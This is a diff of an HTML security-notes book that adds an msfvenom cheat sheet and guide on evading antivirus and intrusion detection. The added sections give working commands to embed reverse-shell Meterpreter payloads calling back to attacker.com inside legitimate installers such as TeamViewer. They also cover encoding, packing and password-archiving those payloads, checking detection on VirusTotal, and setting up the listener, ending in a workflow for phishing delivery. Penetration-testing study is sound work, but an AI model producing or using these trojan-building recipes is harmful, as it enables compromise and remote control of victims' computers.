@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-fbad826e.js";
+            window.path_to_searchindex_js = "searchindex-0f334d3c.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-f5648287.js"></script>
+        <script src="toc-e7018c22.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -210,6 +210,7 @@
 <li><a href="#ncat-file-transfer">ncat</a></li>
 <li><a href="#netcat-file-transfer">netcat</a></li>
 <li><a href="#rdp-file-transfer">rdp</a></li>
+<li><a href="#msfvenom-cheat-sheet">msfvenom</a></li>
 </ul>
 </li>
 <li><a href="clouds/README.html">Clouds</a>
@@ -541,6 +542,7 @@
 <li><a href="#ffuf">ffuf</a></li>
 <li><a href="#hashcat">hashcat</a></li>
 <li><a href="#metasploit-framework">metasploit</a></li>
+<li><a href="#msfvenom">msfvenom</a></li>
 </ul>
 </li>
 <li><a href="troubleshooting/README.html">Troubleshooting</a>
@@ -616,6 +618,7 @@
 <li><a href="#hashcat-1">hashcat</a></li>
 <li><a href="#standard-http-headers">http_headers</a></li>
 <li><a href="#hydra-cheatsheet">hydra</a></li>
+<li><a href="#msfvenom-cheat-sheet">msfvenom</a></li>
 <li><a href="#latency-numbers-every-sre-should-know">latency_numbers</a></li>
 <li><a href="#make-files">make_files</a></li>
 <li><a href="#medusa-cheatsheet">medusa</a></li>
@@ -2647,6 +2650,172 @@ $Session = New-PSSession -ComputerName DATABASE01 -Credential $Credential
 <li><code>/u:&lt;user&gt;</code>: Username</li>
 <li><code>/p:&lt;password&gt;</code>: Password</li>
 <li><code>/drive:&lt;name&gt;,&lt;path&gt;</code>: Mount local directory as network drive</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="msfvenom-cheat-sheet"><a class="header" href="#msfvenom-cheat-sheet">msfvenom cheat sheet</a></h1>
+<h2 id="protection-types"><a class="header" href="#protection-types">Protection Types</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Type</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>Endpoint Protection</strong></td><td>Localized software protecting single hosts (AV, antimalware, firewall, anti-DDoS)</td></tr>
+<tr><td><strong>Perimeter Protection</strong></td><td>Physical/virtual devices on network edge (firewalls, IDS/IPS)</td></tr>
+<tr><td><strong>DMZ</strong></td><td>De-Militarized Zone for public-facing servers with moderate trust level</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="detection-methods"><a class="header" href="#detection-methods">Detection Methods</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Method</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>Signature-based</strong></td><td>Pattern matching against known attack signatures (100% match triggers alarm)</td></tr>
+<tr><td><strong>Heuristic/Anomaly</strong></td><td>Behavioral comparison against established baseline</td></tr>
+<tr><td><strong>Stateful Protocol Analysis</strong></td><td>Comparing protocol events against accepted definitions</td></tr>
+<tr><td><strong>SOC Live Monitoring</strong></td><td>Human analysts monitoring network activity in real-time</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="msfvenom-evasion-commands"><a class="header" href="#msfvenom-evasion-commands">msfvenom Evasion Commands</a></h2>
+<h3 id="backdoored-executable-template"><a class="header" href="#backdoored-executable-template">Backdoored Executable Template</a></h3>
+<pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
+  -k -x ~/Downloads/TeamViewer_Setup.exe \
+  -e x86/shikata_ga_nai -a x86 --platform windows \
+  -o ~/Desktop/TeamViewer_Setup.exe -i 5
+</code></pre>
+<h3 id="key-flags"><a class="header" href="#key-flags">Key Flags</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-k</code></td><td>Keep original executable functionality (run payload in separate thread)</td></tr>
+<tr><td><code>-x &lt;file&gt;</code></td><td>Use executable as template</td></tr>
+<tr><td><code>-e &lt;encoder&gt;</code></td><td>Specify encoder (e.g., <code>x86/shikata_ga_nai</code>)</td></tr>
+<tr><td><code>-i &lt;count&gt;</code></td><td>Number of encoding iterations</td></tr>
+<tr><td><code>-a &lt;arch&gt;</code></td><td>Architecture (x86, x64)</td></tr>
+<tr><td><code>--platform</code></td><td>Target platform (windows, linux)</td></tr>
+<tr><td><code>-f &lt;format&gt;</code></td><td>Output format (exe, elf, raw, js, etc.)</td></tr>
+<tr><td><code>-o &lt;file&gt;</code></td><td>Output file path</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="generate-encoded-payload"><a class="header" href="#generate-encoded-payload">Generate Encoded Payload</a></h3>
+<pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
+  -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
+</code></pre>
+<hr>
+<h2 id="virustotal-analysis"><a class="header" href="#virustotal-analysis">VirusTotal Analysis</a></h2>
+<pre><code class="language-bash">msf-virustotal -k &lt;API_key&gt; -f payload.exe
+</code></pre>
+<hr>
+<h2 id="archive-evasion"><a class="header" href="#archive-evasion">Archive Evasion</a></h2>
+<p>Password-protected archives bypass many AV signatures but may generate “unable to scan” alerts.</p>
+<pre><code class="language-bash"># Create password-protected archive
+zip -e -P secretpass payload.zip payload.exe
+7z a -pSecretPass payload.7z payload.exe
+</code></pre>
+<hr>
+<h2 id="popular-packers"><a class="header" href="#popular-packers">Popular Packers</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Packer</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>UPX</strong></td><td>Universal executable packer</td></tr>
+<tr><td><strong>The Enigma Protector</strong></td><td>Windows executable protection</td></tr>
+<tr><td><strong>MPRESS</strong></td><td>PE/ELF/Mach-O packer</td></tr>
+<tr><td><strong>Themida</strong></td><td>Advanced code protection</td></tr>
+<tr><td><strong>MEW</strong></td><td>Minimal executable packer</td></tr>
+<tr><td><strong>ExeStealth</strong></td><td>Anti-debugging protection</td></tr>
+<tr><td><strong>Morphine</strong></td><td>Polymorphic packer</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="upx-example"><a class="header" href="#upx-example">UPX Example</a></h3>
+<pre><code class="language-bash"># Pack executable
+upx -9 payload.exe -o packed_payload.exe
+
+# Unpack (for analysis)
+upx -d packed_payload.exe
+</code></pre>
+<hr>
+<h2 id="common-encoders-1"><a class="header" href="#common-encoders-1">Common Encoders</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Encoder</th><th>Rank</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>x86/shikata_ga_nai</code></td><td>Excellent</td><td>Polymorphic XOR Additive Feedback</td></tr>
+<tr><td><code>x64/xor</code></td><td>Manual</td><td>Simple XOR encoder</td></tr>
+<tr><td><code>x64/zutto_dekiru</code></td><td>Manual</td><td>Zutto Dekiru encoder</td></tr>
+<tr><td><code>x86/alpha_mixed</code></td><td>Low</td><td>Alphanumeric mixedcase</td></tr>
+<tr><td><code>x86/unicode_mixed</code></td><td>Low</td><td>Unicode mixedcase</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="exploit-code-randomization"><a class="header" href="#exploit-code-randomization">Exploit Code Randomization</a></h2>
+<p>When writing exploit code, add offset randomization to break IDS signatures:</p>
+<pre><code class="language-ruby">'Targets' =&gt;
+[
+ [ 'Windows 2000 SP4 English', { 'Ret' =&gt; 0x77e14c29, 'Offset' =&gt; 5093 } ],
+],
+</code></pre>
+<hr>
+<h2 id="msf6-aes-encryption"><a class="header" href="#msf6-aes-encryption">MSF6 AES Encryption</a></h2>
+<p>MSF6 supports AES-encrypted communication for Meterpreter sessions:</p>
+<pre><code class="language-bash"># Meterpreter runs in memory with encrypted tunnel
+set payload windows/x64/meterpreter/reverse_https
+set EnableStageEncoding true
+set StageEncoder x64/xor
+</code></pre>
+<hr>
+<h2 id="quick-reference"><a class="header" href="#quick-reference">Quick Reference</a></h2>
+<h3 id="generate-stealthy-payload"><a class="header" href="#generate-stealthy-payload">Generate Stealthy Payload</a></h3>
+<pre><code class="language-bash"># Backdoored installer with encoding
+msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 \
+  -x legit_installer.exe -k \
+  -e x86/shikata_ga_nai -i 10 \
+  -f exe -o trojan_installer.exe
+</code></pre>
+<h3 id="handler-setup-for-encrypted-session"><a class="header" href="#handler-setup-for-encrypted-session">Handler Setup for Encrypted Session</a></h3>
+<pre><code class="language-bash">use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+set EnableStageEncoding true
+run -j
+</code></pre>
+<hr>
+<h2 id="evasion-checklist"><a class="header" href="#evasion-checklist">Evasion Checklist</a></h2>
+<ul>
+<li><input disabled="" type="checkbox"> Use executable templates (<code>-x</code> flag)</li>
+<li><input disabled="" type="checkbox"> Enable <code>-k</code> for legitimate functionality</li>
+<li><input disabled="" type="checkbox"> Apply multiple encoding iterations</li>
+<li><input disabled="" type="checkbox"> Consider using packers</li>
+<li><input disabled="" type="checkbox"> Use password-protected archives for delivery</li>
+<li><input disabled="" type="checkbox"> Leverage HTTPS/encrypted channels</li>
+<li><input disabled="" type="checkbox"> Randomize exploit offsets</li>
+<li><input disabled="" type="checkbox"> Avoid obvious NOP sleds</li>
+<li><input disabled="" type="checkbox"> Test against sandbox before deployment</li>
+</ul>
+<hr>
+<h2 id="references"><a class="header" href="#references">References</a></h2>
+<ul>
+<li><a href="https://www.ftc.gov/equifax-data-breach">US Government Post-Mortem Report on Equifax Hack</a></li>
+<li><a href="https://www.infoblox.com/">Protecting from DNS Exfiltration</a></li>
+<li><a href="https://github.com/polypack">PolyPack Project</a></li>
+<li>Metasploit - The Penetration Tester’s Guide (No Starch Press)</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="clouds"><a class="header" href="#clouds">Clouds</a></h1>
@@ -23005,6 +23174,7 @@ PID        TTY     STAT   TIME          CMD
 <li><a href="#need-to-addrefine">cli-tool-improvements</a></li>
 <li><a href="#instructions-for-using-dnspinger">dnspinger</a></li>
 <li><a href="#hydra">hydra</a></li>
+<li><a href="#msfvenom">msfvenom</a></li>
 <li><a href="#metasploit-framework">metasploit</a></li>
 <li><a href="#nmap-1">nmap</a></li>
 <li><a href="#medusa">medusa</a></li>
@@ -24636,7 +24806,7 @@ x86/shikata_ga_nai chosen with final size 611
 Payload size: 611 bytes
 </code></pre>
 <p><strong>Note:</strong> Even with 10 iterations, modern AV products still often detect these payloads. Additional evasion methodologies are required for reliable evasion.</p>
-<h3 id="virustotal-analysis"><a class="header" href="#virustotal-analysis">VirusTotal Analysis</a></h3>
+<h3 id="virustotal-analysis-1"><a class="header" href="#virustotal-analysis-1">VirusTotal Analysis</a></h3>
 <p>Metasploit offers <code>msf-virustotal</code> tool to analyze payloads (requires free VirusTotal registration):</p>
 <pre><code class="language-bash">msf-virustotal -k &lt;API key&gt; -f TeamViewerInstall.exe
 
@@ -25040,6 +25210,338 @@ msf6 &gt; jobs -K
 [*] Stopping all jobs...
 </code></pre>
 <p><strong>Important:</strong> Using <code>[CTRL] + [C]</code> to stop an exploit will not properly release the port. Always use <code>jobs -k &lt;id&gt;</code> to terminate jobs and free up ports correctly.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="msfvenom"><a class="header" href="#msfvenom">msfvenom</a></h1>
+<p>Understanding how targets are defended helps attack them more efficiently and quietly. Defense mechanisms fall into two main categories: <strong>Endpoint Protection</strong> and <strong>Perimeter Protection</strong>.</p>
+<hr>
+<h2 id="endpoint-protection"><a class="header" href="#endpoint-protection">Endpoint Protection</a></h2>
+<p>Endpoint protection refers to localized device or service protection for a single host on the network. The host can be a personal computer, corporate workstation, or server in a DMZ.</p>
+<h3 id="common-components"><a class="header" href="#common-components">Common Components</a></h3>
+<p>Endpoint protection usually comes as software packages that include:</p>
+<ul>
+<li><strong>Antivirus Protection</strong> - Signature-based malware detection</li>
+<li><strong>Antimalware Protection</strong> - Bloatware, spyware, adware, scareware, ransomware</li>
+<li><strong>Host Firewall</strong> - Local traffic filtering</li>
+<li><strong>Anti-DDoS</strong> - Denial of service protection</li>
+</ul>
+<h3 id="popular-endpoint-protection-products"><a class="header" href="#popular-endpoint-protection-products">Popular Endpoint Protection Products</a></h3>
+<ul>
+<li>Avast</li>
+<li>Nod32</li>
+<li>Malwarebytes</li>
+<li>BitDefender</li>
+<li>Windows Defender</li>
+<li>ClamAV</li>
+</ul>
+<hr>
+<h2 id="perimeter-protection"><a class="header" href="#perimeter-protection">Perimeter Protection</a></h2>
+<p>Perimeter protection comes in physical or virtualized devices on the network perimeter edge. These edge devices provide access inside the network from the outside (public to private).</p>
+<h3 id="network-zones"><a class="header" href="#network-zones">Network Zones</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Zone</th><th>Description</th><th>Trust Level</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>Outside</strong></td><td>The Internet, public networks</td><td>Lowest</td></tr>
+<tr><td><strong>DMZ</strong></td><td>Public-facing servers (web, email, DNS)</td><td>Medium</td></tr>
+<tr><td><strong>Inside</strong></td><td>Internal corporate network</td><td>Highest</td></tr>
+</tbody>
+</table>
+</div>
+<p>The DMZ houses servers that push and pull data for public clients from the Internet but are managed from the inside network.</p>
+<hr>
+<h2 id="security-policies"><a class="header" href="#security-policies">Security Policies</a></h2>
+<p>Security policies function like ACLs (Access Control Lists) - essentially allow and deny statements that dictate how traffic or files can exist within a network boundary.</p>
+<h3 id="policy-types"><a class="header" href="#policy-types">Policy Types</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Policy Type</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>Network Traffic Policies</strong></td><td>Control packet flow based on ports, protocols, IPs</td></tr>
+<tr><td><strong>Application Policies</strong></td><td>Control which applications can run</td></tr>
+<tr><td><strong>User Access Control Policies</strong></td><td>Define user permissions and authentication</td></tr>
+<tr><td><strong>File Management Policies</strong></td><td>Control file access, modification, transfer</td></tr>
+<tr><td><strong>DDoS Protection Policies</strong></td><td>Rate limiting, traffic shaping</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="detection-methods-1"><a class="header" href="#detection-methods-1">Detection Methods</a></h2>
+<h3 id="signature-based-detection"><a class="header" href="#signature-based-detection">Signature-based Detection</a></h3>
+<p>Compares network packets against pre-built attack pattern signatures. Any 100% match generates alarms.</p>
+<p><strong>Pros:</strong></p>
+<ul>
+<li>Very accurate for known threats</li>
+<li>Low false positive rate</li>
+</ul>
+<p><strong>Cons:</strong></p>
+<ul>
+<li>Cannot detect new/unknown attacks</li>
+<li>Requires constant signature updates</li>
+</ul>
+<h3 id="heuristicstatistical-anomaly-detection"><a class="header" href="#heuristicstatistical-anomaly-detection">Heuristic/Statistical Anomaly Detection</a></h3>
+<p>Behavioral comparison against an established baseline, including APT (Advanced Persistent Threat) signatures.</p>
+<p><strong>Detection Approach:</strong></p>
+<ol>
+<li>Establish baseline of normal network behavior</li>
+<li>Identify commonly used protocols</li>
+<li>Generate alarms when deviations exceed threshold</li>
+</ol>
+<h3 id="stateful-protocol-analysis-detection"><a class="header" href="#stateful-protocol-analysis-detection">Stateful Protocol Analysis Detection</a></h3>
+<p>Recognizes divergence of protocols by event comparison using pre-built profiles of generally accepted non-malicious activity definitions.</p>
+<h3 id="live-monitoring-and-alerting-soc-based"><a class="header" href="#live-monitoring-and-alerting-soc-based">Live-monitoring and Alerting (SOC-based)</a></h3>
+<p>Security Operations Center (SOC) analysts use live-feed software to monitor network activity and intermediate alarming systems for potential threats.</p>
+<hr>
+<h2 id="evasion-techniques"><a class="header" href="#evasion-techniques">Evasion Techniques</a></h2>
+<h3 id="payload-encoding"><a class="header" href="#payload-encoding">Payload Encoding</a></h3>
+<p>Most host-based antivirus software relies on signature-based detection. Encoding payloads can help evade these signatures.</p>
+<h4 id="generate-encoded-payload-1"><a class="header" href="#generate-encoded-payload-1">Generate Encoded Payload</a></h4>
+<pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
+  -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>Found 1 compatible encoders
+Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 27 (iteration=0)
+x86/shikata_ga_nai succeeded with size 54 (iteration=1)
+x86/shikata_ga_nai succeeded with size 81 (iteration=2)
+x86/shikata_ga_nai succeeded with size 108 (iteration=3)
+x86/shikata_ga_nai succeeded with size 135 (iteration=4)
+x86/shikata_ga_nai chosen with final size 135
+Payload size: 135 bytes
+Saved as: /home/user/test.js
+</code></pre>
+<p><strong>Note:</strong> Simply encoding payloads with multiple iterations is often not sufficient for all AV products.</p>
+<h3 id="encrypted-communication-channels"><a class="header" href="#encrypted-communication-channels">Encrypted Communication Channels</a></h3>
+<p>MSF6 can tunnel AES-encrypted communication from Meterpreter shells back to the attacker, successfully encrypting traffic as the payload is sent.</p>
+<p><strong>Benefits:</strong></p>
+<ul>
+<li>Evades network-based IDS/IPS</li>
+<li>Meterpreter runs in memory (no file on disk)</li>
+</ul>
+<h3 id="executable-templates-backdoored-executables"><a class="header" href="#executable-templates-backdoored-executables">Executable Templates (Backdoored Executables)</a></h3>
+<p>msfvenom can embed payloads into legitimate executable files, hiding shellcode deep within legitimate code.</p>
+<h4 id="create-backdoored-executable"><a class="header" href="#create-backdoored-executable">Create Backdoored Executable</a></h4>
+<pre><code class="language-bash">msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 \
+  -k -x ~/Downloads/TeamViewer_Setup.exe \
+  -e x86/shikata_ga_nai -a x86 --platform windows \
+  -o ~/Desktop/TeamViewer_Setup.exe -i 5
+</code></pre>
+<p><strong>Output:</strong></p>
+<pre><code>Found 1 compatible encoders
+Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 27 (iteration=0)
+x86/shikata_ga_nai succeeded with size 54 (iteration=1)
+x86/shikata_ga_nai succeeded with size 81 (iteration=2)
+x86/shikata_ga_nai succeeded with size 108 (iteration=3)
+x86/shikata_ga_nai succeeded with size 135 (iteration=4)
+x86/shikata_ga_nai chosen with final size 135
+Payload size: 135 bytes
+Saved as: /home/user/Desktop/TeamViewer_Setup.exe
+</code></pre>
+<h4 id="key-flags-1"><a class="header" href="#key-flags-1">Key Flags</a></h4>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-k</code></td><td>Keep template’s normal execution flow (payload runs in separate thread)</td></tr>
+<tr><td><code>-x &lt;file&gt;</code></td><td>Specify executable template</td></tr>
+<tr><td><code>-e &lt;encoder&gt;</code></td><td>Encoder to use</td></tr>
+<tr><td><code>-i &lt;iterations&gt;</code></td><td>Number of encoding passes</td></tr>
+<tr><td><code>-a &lt;arch&gt;</code></td><td>Target architecture</td></tr>
+<tr><td><code>--platform</code></td><td>Target platform</td></tr>
+</tbody>
+</table>
+</div>
+<p><strong>Note:</strong> With <code>-k</code> flag, the original application runs normally while the payload executes in a separate thread. However, if launched from CLI, a separate window may pop up for the payload.</p>
+<hr>
+<h2 id="archives-for-evasion"><a class="header" href="#archives-for-evasion">Archives for Evasion</a></h2>
+<p>Password-protected archives bypass many common AV signatures because the scanner cannot inspect the contents.</p>
+<h3 id="creating-protected-archives"><a class="header" href="#creating-protected-archives">Creating Protected Archives</a></h3>
+<pre><code class="language-bash"># ZIP with password
+zip -e -P password payload.zip payload.exe
+
+# 7-Zip with password
+7z a -pPassword123 payload.7z payload.exe
+</code></pre>
+<p><strong>Considerations:</strong></p>
+<ul>
+<li>Files will be flagged as “unable to scan” in AV dashboards</li>
+<li>Administrators may manually inspect locked archives</li>
+<li>Effective for initial delivery when combined with social engineering</li>
+</ul>
+<hr>
+<h2 id="packers"><a class="header" href="#packers">Packers</a></h2>
+<p>Packers compress and obfuscate executables by packing the payload with decompression code into a single file. When run, the decompression code restores the original executable transparently.</p>
+<h3 id="popular-packers-1"><a class="header" href="#popular-packers-1">Popular Packers</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Packer</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><strong>UPX</strong></td><td>Universal packer, widely used</td></tr>
+<tr><td><strong>The Enigma Protector</strong></td><td>Windows executable protection</td></tr>
+<tr><td><strong>MPRESS</strong></td><td>Compact packer for PE/ELF/Mach-O</td></tr>
+<tr><td><strong>Alternate EXE Packer</strong></td><td>Simple Windows packer</td></tr>
+<tr><td><strong>ExeStealth</strong></td><td>Anti-debugging features</td></tr>
+<tr><td><strong>MEW</strong></td><td>Minimal size packer</td></tr>
+<tr><td><strong>Themida</strong></td><td>Advanced code virtualization</td></tr>
+<tr><td><strong>Morphine</strong></td><td>Polymorphic packer</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="upx-usage"><a class="header" href="#upx-usage">UPX Usage</a></h3>
+<pre><code class="language-bash"># Compress executable
+upx -9 payload.exe -o packed.exe
+
+# Maximum compression with --ultra-brute
+upx --ultra-brute payload.exe -o packed.exe
+
+# Decompress (for analysis)
+upx -d packed.exe
+</code></pre>
+<p><strong>Reference:</strong> Check out the <a href="https://github.com/polypack">PolyPack project</a> for more packer information.</p>
+<hr>
+<h2 id="virustotal-analysis-2"><a class="header" href="#virustotal-analysis-2">VirusTotal Analysis</a></h2>
+<p>Use Metasploit’s built-in VirusTotal integration to test detection rates:</p>
+<pre><code class="language-bash">msf-virustotal -k &lt;API_key&gt; -f test.js
+</code></pre>
+<p><strong>Sample Output:</strong></p>
+<pre><code>[*] Using API key: &lt;API key&gt;
+[*] Please wait while I upload test.js...
+[*] VirusTotal: Scan request successfully queued
+[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a
+[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309
+[*] Analysis link: https://www.virustotal.com/gui/file/&lt;SNIP&gt;/detection
+[*] Analysis Report: test.js (11 / 59)
+</code></pre>
+<h3 id="detection-rates-example"><a class="header" href="#detection-rates-example">Detection Rates Example</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Antivirus</th><th>Detected</th><th>Result</th></tr>
+</thead>
+<tbody>
+<tr><td>AVG</td><td>true</td><td>Win32:ShikataGaNai-A [Trj]</td></tr>
+<tr><td>Avast</td><td>true</td><td>Win32:ShikataGaNai-A [Trj]</td></tr>
+<tr><td>BitDefender</td><td>true</td><td>Exploit.Metacoder.Shikata.Gen</td></tr>
+<tr><td>ClamAV</td><td>true</td><td>Win.Trojan.MSShellcode-6360729-0</td></tr>
+<tr><td>ESET-NOD32</td><td>false</td><td>-</td></tr>
+<tr><td>Kaspersky</td><td>false</td><td>-</td></tr>
+<tr><td>Malwarebytes</td><td>false</td><td>-</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="exploit-code-considerations"><a class="header" href="#exploit-code-considerations">Exploit Code Considerations</a></h2>
+<h3 id="offset-randomization"><a class="header" href="#offset-randomization">Offset Randomization</a></h3>
+<p>When coding exploits, add randomization to break IPS/IDS database signatures for well-known exploit buffers:</p>
+<pre><code class="language-ruby">'Targets' =&gt;
+[
+ [ 'Windows 2000 SP4 English', { 'Ret' =&gt; 0x77e14c29, 'Offset' =&gt; 5093 } ],
+],
+</code></pre>
+<h3 id="avoid-obvious-nop-sleds"><a class="header" href="#avoid-obvious-nop-sleds">Avoid Obvious NOP Sleds</a></h3>
+<p>IPS/IDS regularly check for standard NOP sleds. Test custom exploit code against a sandbox before deployment.</p>
+<h3 id="buffer-overflow-considerations"><a class="header" href="#buffer-overflow-considerations">Buffer Overflow Considerations</a></h3>
+<ul>
+<li>Typical BoF exploits are easily distinguished by hexadecimal buffer patterns</li>
+<li>Use randomized shellcode encoding</li>
+<li>Vary NOP equivalents (NOPs can be replaced with other single-byte instructions)</li>
+</ul>
+<hr>
+<h2 id="msf6-encrypted-sessions"><a class="header" href="#msf6-encrypted-sessions">MSF6 Encrypted Sessions</a></h2>
+<h3 id="https-meterpreter-with-stage-encoding"><a class="header" href="#https-meterpreter-with-stage-encoding">HTTPS Meterpreter with Stage Encoding</a></h3>
+<pre><code class="language-bash">use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+set EnableStageEncoding true
+set StageEncoder x64/xor
+run -j
+</code></pre>
+<h3 id="benefits-5"><a class="header" href="#benefits-5">Benefits</a></h3>
+<ul>
+<li>AES-encrypted tunnel between Meterpreter and attacker</li>
+<li>Payload runs in memory (harder to detect)</li>
+<li>Encrypted traffic blends with normal HTTPS traffic</li>
+</ul>
+<hr>
+<h2 id="dns-exfiltration"><a class="header" href="#dns-exfiltration">DNS Exfiltration</a></h2>
+<p>In cases with strict traffic rules, DNS can be used for data exfiltration. This technique was notably used in the Equifax breach of 2017.</p>
+<h3 id="characteristics"><a class="header" href="#characteristics">Characteristics</a></h3>
+<ul>
+<li>Slow but stealthy</li>
+<li>Often allowed through firewalls</li>
+<li>Difficult to detect without DNS-specific monitoring</li>
+<li>Can bypass IP-based filtering</li>
+</ul>
+<h3 id="references-1"><a class="header" href="#references-1">References</a></h3>
+<ul>
+<li><a href="https://www.ftc.gov/equifax-data-breach">US Government Post-Mortem Report on Equifax Hack</a></li>
+<li><a href="https://www.infoblox.com/">Protecting from DNS Exfiltration</a></li>
+<li><a href="https://www.infoblox.com/">Stopping Data Exfil and Malware Spread through DNS</a></li>
+</ul>
+<hr>
+<h2 id="evasion-workflow"><a class="header" href="#evasion-workflow">Evasion Workflow</a></h2>
+<h3 id="step-1-choose-delivery-method"><a class="header" href="#step-1-choose-delivery-method">Step 1: Choose Delivery Method</a></h3>
+<ul>
+<li>Backdoored executable</li>
+<li>Macro-enabled document</li>
+<li>Script file (JS, VBS, PS1)</li>
+<li>Archive with password</li>
+</ul>
+<h3 id="step-2-apply-obfuscation"><a class="header" href="#step-2-apply-obfuscation">Step 2: Apply Obfuscation</a></h3>
+<pre><code class="language-bash"># Generate encoded backdoored executable
+msfvenom -p windows/meterpreter/reverse_https LHOST=attacker.com LPORT=443 \
+  -x legit_app.exe -k \
+  -e x86/shikata_ga_nai -i 15 \
+  -f exe -o trojan.exe
+</code></pre>
+<h3 id="step-3-pack-the-payload-optional"><a class="header" href="#step-3-pack-the-payload-optional">Step 3: Pack the Payload (Optional)</a></h3>
+<pre><code class="language-bash">upx -9 trojan.exe -o trojan_packed.exe
+</code></pre>
+<h3 id="step-4-test-detection"><a class="header" href="#step-4-test-detection">Step 4: Test Detection</a></h3>
+<pre><code class="language-bash">msf-virustotal -k &lt;API_key&gt; -f trojan_packed.exe
+</code></pre>
+<h3 id="step-5-setup-handler"><a class="header" href="#step-5-setup-handler">Step 5: Setup Handler</a></h3>
+<pre><code class="language-bash">use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+set EnableStageEncoding true
+run -j
+</code></pre>
+<h3 id="step-6-deliver-and-execute"><a class="header" href="#step-6-deliver-and-execute">Step 6: Deliver and Execute</a></h3>
+<ul>
+<li>Social engineering</li>
+<li>Phishing email</li>
+<li>Physical access</li>
+<li>Exploit existing vulnerability</li>
+</ul>
+<hr>
+<h2 id="important-notes"><a class="header" href="#important-notes">Important Notes</a></h2>
+<ol>
+<li><strong>Testing Environment</strong>: Always test evasion techniques in a sandbox before live deployment</li>
+<li><strong>Single Chance</strong>: During assessments, you may only have one opportunity to succeed</li>
+<li><strong>Signature Updates</strong>: AV vendors regularly update signatures for known tools</li>
+<li><strong>Layered Approach</strong>: Combine multiple evasion techniques for better results</li>
+<li><strong>Legal Compliance</strong>: Only use these techniques during authorized penetration tests</li>
+</ol>
+<hr>
+<h2 id="additional-resources"><a class="header" href="#additional-resources">Additional Resources</a></h2>
+<ul>
+<li><a href="https://nostarch.com/metasploit">Metasploit - The Penetration Tester’s Guide</a> - No Starch Press</li>
+<li><a href="https://github.com/polypack">PolyPack Project</a> - Packer research</li>
+<li><a href="https://github.com/Veil-Framework/Veil">Veil Framework</a> - Payload generation framework</li>
+<li><a href="https://www.shellterproject.com/">Shellter</a> - Dynamic shellcode injection</li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="troubleshooting-1"><a class="header" href="#troubleshooting-1">Troubleshooting</a></h1>
 <h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
@@ -26342,7 +26844,7 @@ Thus using an <strong>ACK scan</strong> (-sA) might be a good idea because the f
 <pre><code>nc -nv --source-port 53 10.129.2.28 50000
 </code></pre>
 <hr>
-<h2 id="references"><a class="header" href="#references">References</a></h2>
+<h2 id="references-2"><a class="header" href="#references-2">References</a></h2>
 <ul>
 <li><a href="https://nmap.org/book/man-port-scanning-techniques.html">Nmap scan types</a></li>
 <li><a href="https://www.nmap.org">nmap docs</a></li>
